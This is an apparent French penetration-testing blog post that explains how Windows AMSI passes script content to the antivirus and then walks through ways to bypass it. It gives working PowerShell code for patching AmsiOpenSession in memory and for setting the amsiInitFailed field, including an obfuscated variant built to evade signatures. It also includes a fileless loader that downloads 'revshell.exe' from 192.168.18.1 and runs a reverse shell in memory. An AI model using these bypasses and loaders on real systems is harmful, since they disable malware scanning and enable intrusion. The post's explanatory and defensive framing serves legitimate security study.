---
layout: post
author: [DJO, SSY, PLA, NDU]
title: "Comprendre le fonctionnement d'un antivirus 101 - détection en mémoire"
date: 2025-06-10
categories: [Articles, AD]
image: assets/AV.jpg
title_color: "#ffffff"
---

# Comprendre le fonctionnement d'un antivirus 101 - détection en mémoire

Cet article vient en complément du premier et vient cette fois aborder le composant "AMSI", clé dans la détection de menaces en mémoire.

## 1. Comment fonctionne l'AMSI

Pour renforcer la protection contre les scripts malveillants, notamment sous PowerShell, Microsoft a introduit l'AMSI. 

Lorsqu'une commande ou un script s'exécute, l'AMSI intercepte son contenu et le transmet à l'antivirus pour analyser et détecter les potentiels menaces. Toutes ses communications se font via le protocole RPC. 

__Définition du RPC :__

L'appel de procédure à distance (RPC, Remote Procedure Call) est un [protocole](https://www.lemagit.fr/definition/Protocole) qu'un programme peut utiliser pour solliciter un service auprès d'un programme situé sur un autre ordinateur d'un [réseau](https://www.lemagit.fr/definition/Reseau) dont il n'a pas besoin de connaître les détails. On l'appelle parfois appel de fonction ou de sous-routine. ([source](https://www.lemagit.fr/definition/Remote-procedure-call-RPC))

### 1.1. **Fonctionnement des RPC dans l'interaction entre l'AMSI et Windows Defender :**

1. **Appel de l'API AMSI par une application :**
   - Une application (par exemple, PowerShell ou un éditeur de code) appelle une fonction AMSI comme `AmsiScanBuffer` ou `AmsiScanString` pour analyser un contenu.
   - Ces fonctions sont implémentées dans **amsi.dll**
2. **Transfert des données à l'antivirus via RPC :**
   - **amsi.dll** utilise les calls RPC pour transmettre les données à analyser à l'antivirus local (par exemple, Windows Defender etc ...).
3. **Analyse par l'antivirus :**
   - L'antivirus reçoit les données via le canal RPC.
   - Il analyse les données en fonction de ses signatures, algorithmes heuristiques  pour détecter des menaces.
4. **Retour des résultats via RPC :**
   - Après l’analyse, le moteur antimalware renvoie le résultat via le même canal RPC.
   - **amsi.dll** transmet ce résultat à l’application appelante sous la forme d’un code d’état , comme `AMSI_RESULT_DETECTED` (contenu malveillant détecté) ou `AMSI_RESULT_CLEAN` (aucune menace détectée).

### 1.2. Composants Windows qui s’intègrent à l’interface AMSI

Les fonctionnalités de l'API AMSI sont intégrées dans les composants [Windows](https://learn.microsoft.com/fr-fr/windows/win32/amsi/antimalware-scan-interface-portal) suivants : 

- Contrôle de compte d’utilisateur ou UAC (élévation d’une installation EXE, COM, MSI ou ActiveX) ;
- PowerShell (scripts, utilisation interactive) ;
- Hôte de script Windows (wscript.exe et cscript.exe) ;
- JavaScript et VBScript ;
- Macros VBA Office.

Pour chacun d'entre eux, le processus décrit dans la partie précédente s'applique.

### 1.3. Cas d'exemple avec Powershell

Lorsqu'on analyse les modules chargés en mémoire par le processus, on constate bien la présence de la DLL amsi.dll. L'antivirus recevra donc la mémoire du processus Powershell récupérée par amsi.dll via les fonctions `ÀmsiScanBuffer` et `ÀmsiScanString`.

![image-20241128181629731](/assets/posts/AV/image-20241128181629731.png)

## 2. Comment contourner l'AMSI

Une liste de BYPASS AMSI connu existe : https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell. 

Voici en détails les plus utilisées :

### 2.1. Patch des instructions d'assembleur en mémoire sur les fonctions AmsiScanBuffer / AmsiScanString / AmsiOpenSession

Les applications qui utilisent l'AMSI vont se baser sur le retour des fonctions AmsiScanBuffer ou AmsiScanString. Les codes de résultats sont les suivants : 

```
AMSI_RESULT_CLEAN
	Known good. No detection found, and the result is likely not going to change after a future definition update.
AMSI_RESULT_NOT_DETECTED
	No detection found, but the result might change after a future definition update.
AMSI_RESULT_BLOCKED_BY_ADMIN_START
	Administrator policy blocked this content on this machine (beginning of range).
AMSI_RESULT_BLOCKED_BY_ADMIN_END
	Administrator policy blocked this content on this machine (end of range).
AMSI_RESULT_DETECTED
	Detection found. The content is considered malware and should be blocked.
```

Une des méthodes de bypass de l'AMSI est de patcher la mémoire pour modifier les instructions assembleurs des fonctions AmsiScanBuffer,AmsiScanString ou AmsiOpenSession.

Le principe est simple il suffit de modifier directement l'une des fonctions en mémoire pour forcer un retour de positif des fonctions de scan.

Cela nécessite tout de même de pouvoir modifier la protection mémoire de l'emplacement de ces fonctions en mémoire donc cette méthode n'est pas très efficace contre les EDR.

Par exemple la fonction *AmsiOpenSession* peut être ciblé en forçant une erreur dans le flow de l'application ce qui forcera un retour null ou positif à l'application appelante (Exemple de code : https://github.com/snovvcrash/PPN/blob/master/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass.md)

Le code Powershell suivant va : 

* Venir chercher en mémoire l'adresse de la fonction AmsiOpenSession dans la dll amsi.dll
* Modifier la protection mémoire de l'emplacement de la fonction AmsiOpenSession en PAGE_EXECUTE_READWRITE pour pouvoir modifier la fonction
* Modifier la fonction en mémoire pour appliquer le patch
* Modifier la protection mémoire pour la restaurer en PAGE_EXECUTE_READ

```powershell
function lookupFunc {
    Param ($moduleName, $funcName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | % {If($_.Name -eq "GetProcAddress") {$tmp += $_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $funcName))
}

function getDelegateType {
    Param (
        [Parameter(Position=0, Mandatory=$True)][Type[]] $argsTypes,
        [Parameter(Position=1)][Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argsTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argsTypes).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Cherche en mémoire l'adresse de la fonction AmsiOpenSession dans la dll amsi.dll
[IntPtr]$funcAddr = lookupFunc amsi.dll AmsiOpenSession
$oldProtection = 0
$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
# Modification de la protection mémoire de l'emplacemment de la fonction AmsiOpenSEssion en modification
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtection)
$buf = [Byte[]] (0x48, 0x31, 0xC0)
# Applicationd du patch
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
# Restauration de la protection de la page
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtection)
```

Une fois ce code entrée dans une session Powershell, l'AMSI ne transmet plus les informations exécutée dans la session à l'antivirus.

### 2.2. Hooking

> https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/
>

La méthode de *hook* pour contourner l'AMSI (ou d'autres API système) consiste à intercepter les appels à des fonctions spécifiques (comme `AmsiScanBuffer` ou `AmsiScanString`) et à les rediriger vers un code personnalisé. Cela permet de modifier le comportement de la fonction cible sans changer son code d'origine. 

### 2.3. Hardware Breakpoint

> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Using-Hardware-Breakpoints
>

L'idée est de placer un *hardware breakpoint* sur la fonction **`AmsiScanBuffer`** (ou une autre fonction AMSI). Une fois que cette fonction est appelée, le *breakpoint* intercepte l'exécution, et le programme peut rediriger ou modifier son comportement

### 2.4. Exploiter amsiInitFailed

**`amsiInitFailed`** est un champ interne dans la classe **`System.Management.Automation.AmsiUtils`**, qui appartient à l'assembly utilisé par PowerShell.

Cette variable sert à indiquer si AMSI a été correctement initialisé. Si la valeur de `amsiInitFailed` est définie sur `true`, PowerShell suppose que l'initialisation d'AMSI a échoué, et il ignore les appels à AMSI (comme les scans via `AmsiScanBuffer`).

En modifiant ce champ pour le définir sur `true`, on peut désactiver AMSI dans PowerShell sans avoir à patcher directement `amsi.dll` ou ses fonctions comme `AmsiScanBuffer`.

C'est la méthode la plus efficace pour contourner l'AMSI dans un contexte Powershell.

```powershell
# Utilisation de la réflexion pour accéder à la classe et au champ
$AmsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$Field = $AmsiUtils.GetField("amsiInitFailed", "NonPublic,Static")

# Définir le champ sur 'true' pour désactiver AMSI
$Field.SetValue($null, $true)
```

Le code précédent est une variante connue des AV donc pour que cette méthode fonctionne, il faut obfusquer les champs amsiInitFailed et System.Management.Automation.AmsiUtils.

Voilà un exemple.

```bash
# Define two long numeric strings
$A = "5492868772801748688168747280728187173688878280688776828"
$B = "1173680867656877679866880867644817687416876797271"

# Decode a string to get the type name using reflection
$typeName = [string](0..37 | ForEach-Object {
    # Calculate character codes and convert them to characters
    [char][int](29 + ($A + $B).Substring($_ * 2, 2))
}) -replace " "

# Decode another string to get the field name
$fieldName = [string](38..51 | ForEach-Object {
    # Calculate character codes and convert them to characters
    [char][int](29 + ($A + $B).Substring($_ * 2, 2))
}) -replace " "

# Use reflection to get the specified type and field
$type = [Ref].Assembly.GetType($typeName)
$field = $type.GetField($fieldName, 'NonPublic,Static')

# Set the value of the field to true
$field.SetValue($null, $true)
```

### 2.5. Écrire sur le pointeur des fonctions amsi en mémoire

Cette technique, dévoilée l'année dernière par Victor Khoury, consiste essentiellement à écraser les adresses des pointeurs des fonctions AMSI, telles que **AMSI Scan Buffer**, dans les DLL qui y font appel. Plus de détails sur cet [article](https://www.offsec.com/blog/amsi-write-raid-0day-vulnerability/).

# 3. Fileless execution

Exécuter un exécutable .NET directement en mémoire dans PowerShell est un processus sophistiqué qui repose sur l'utilisation des fonctionnalités avancées du CLR (.NET Common Language Runtime) exposées dans PowerShell via des objets .NET. 

L'avantage pour un attaquant de cette méthode d'éxécution est qu'en combinant cette méthode et le bypass AMSI, le contenu passé dans le processus powershell ne pourra pas être scanné par l'antivirus.

## 3.1. Exemple de code

Voici un exemple de code C# , pour montrer la puissance de ces fonctionnalités, nous allons prendre un cas assez simple. Voici un programme écrit en C# avec plusieurs fonctions définies.

Certaines de ces fonctions nécessite des arguments pour pouvoir fonctionner.

```c#
using System;

namespace HelloWorldApp
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("Hello, World!");
        }

        public static void SayHello(string name)
        {
            Console.WriteLine($"Hello, {name}!");
        }

        public static int AddNumbers(int a, int b)
        {
            return a + b;
        }
    }
}
```

Une fois notre code compilé nous allons maintenant le charger en mémoire :

```powershell
# URL de l'exécutable
$url = "http://example.com/HelloWorld.exe"

# Télécharger le fichier dans un tableau de bytes
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$bytes = $response.Content

# Charger l'assembly .NET en mémoire
$assembly = [System.Reflection.Assembly]::Load([System.Text.Encoding]::UTF8.GetBytes($bytes))
# Obtenir le type contenant la méthode à exécuter
$type = $assembly.GetType("HelloWorldApp.Program")
```

Une fois qu'on maîtrise le type contenant la méthode à exécuter, nous pouvons maintenant appeler les fonctions que nous avons défini précedemment.

```powershell
# Appeler une méthode spécifique avec des paramètres
# Appel de SayHello("John")
$method = $type.GetMethod("SayHello")
$method.Invoke($null, @("John"))

# Appeler une méthode avec un retour (AddNumbers)
$methodAdd = $type.GetMethod("AddNumbers")
$result = $methodAdd.Invoke($null, @(5, 10))
Write-Host "Le résultat de AddNumbers(5, 10) est : $result"
```

Et voilà ! On a exécuter notre programme C# en mémoire , en combinant avec le bypass AMSI, l'antivirus ne pourra pas scanner le contenu.

```powershell
Hello, John!
Le résultat de AddNumbers(5, 10) est : 15
```

## 3.2. Cas réel

### 3.2.1. Loader

Le code suivant permettra d'exécuter en mémoire notre reverse shell :

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.18.1/revshell.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[ProcessHollowing.Program]::Main("".Split())
```

### 3.2.2. Bypass Amsi dans le DOTNET

Lorsqu'une application est exécutée en mémoire dans powershell, le contenu de l'application est envoyé à l'antivirus local via l'AMSI. De ce fait, il faut outrepasser l'AMSI dans ce contexte pour pouvoir exécuter notre application sans laisser de trace sur le disque.

### 3.2.3. Fonctionnement de l'AMSI dans la réflexion DOTNET

Pour réaliser ce bypass, la méthode de bypass AMSI de Victor Khoury a été utilisée.

En plaçant un point d'arrêt sur la fonction `AmsiScanBuffer`, on peut observer une différence dans la séquence des appels de fonctions entre l'exécution d'une commande PowerShell et l'exécution en mémoire d'un programme.

=> Voici la liste d'appel pour une exécution classique de commande dans la console Powershell :

![image-20250130225121151](/assets/posts/AV/image-20250130225121151.png)

=> Voici la liste d'appel pour une exécution d'un programme DOTNET en mémoire dans la console powershell :

![image-20250130225926803](/assets/posts/AV/image-20250130225926803.png)

Le module CLR , qui est le moteur d'exécution du framework **.NET**, fait appel à la fonctionnalité AmsiScan. 

La méthode que Victor Khoury a trouvée consiste a venir écraser en mémoire l'emplacement du pointeur de la fonction `amsi!AmsiScanBuffer`.

En analysant l'instruction qui appelle la fonction AmsiScanBuffer, on se rend compte que la fonction est appelé à travers `_guard_dispatch_icall_fptr`. Fonction qui est un mécanisme de sécurité implémenté par Windows pour prévenir les attaques basées sur le détournement du flux d’exécution, comme le **Return-Oriented Programming (ROP)** ou le **Jump-Oriented Programming (JOP)**. 

Juste avant cet appel,une instruction est réalisée pour déplacer le contenu d'un pointeur qui contient l'adresse de la fonction `amsi!AmsiScanBuffer` vers le registre RAX afin que la fonction. 

![image-20250130231107226](/assets/posts/AV/image-20250130231107226.png)

En vérifiant le contenu de cette adresse nous pouvons observer la présence du pointeur vers la fonction `amsi!AmsiScanBuffer`.

![image-20250130231206786](/assets/posts/AV/image-20250130231206786.png)

En analysant la protection mémoire de l'adresse, on remarque que l'adresse des pointeurs font bien partie de la dll `clr.dll` et qu'il est possible d'écrire sur les pointeurs car leur protection est en `PAGE_READWRITE`. 

![image-20250130231803546](/assets/posts/AV/image-20250130231803546.png)

Pour outrepasser l'AMSI dans l’exécution en mémoire d'un exécutable .net, il faudrait alors modifier en mémoire l'adresse contenant les pointeurs vers la fonction amsiScanBuffer dans la dll `clr.dll` et la remplacer par une vraie fonction qui ne retourne rien, par exemple pour contourner la fonction `_guard_dispatch_icall_fptr` . 

Lorsque l'on exécute notre Rubeus en mémoire nous avons l'erreur suivante, signe que l'AMSI est bien présent lors de l’exécution en mémoire.

![image-20250203105351527](/assets/posts/AV/image-20250203105351527.png)

Le code du POC n'est pas fourni mais voici l'exécution du bypass pour remplacer les pointeurs de la fonction `amsi!AmsiScanBuffer` avec une fonction factice dans la mémoire de la dll `clr.dll`. 

![image-20250203105418712](/assets/posts/AV/image-20250203105418712.png)

Il est maintenant possible d'exécuter Rubeus en mémoire.

![image-20250203110943509](/assets/posts/AV/image-20250203110943509.png)

Cependant, même en exécutant le script en mémoire, nous rencontrons un nouveau problème : notre PowerShell est interrompu par Defender en raison d'un comportement suspect. 

Cela confirme que nous avons bien contourné l'AMSI et sa détection statique.

![image-20250203110217958](/assets/posts/AV/image-20250203110217958.png)













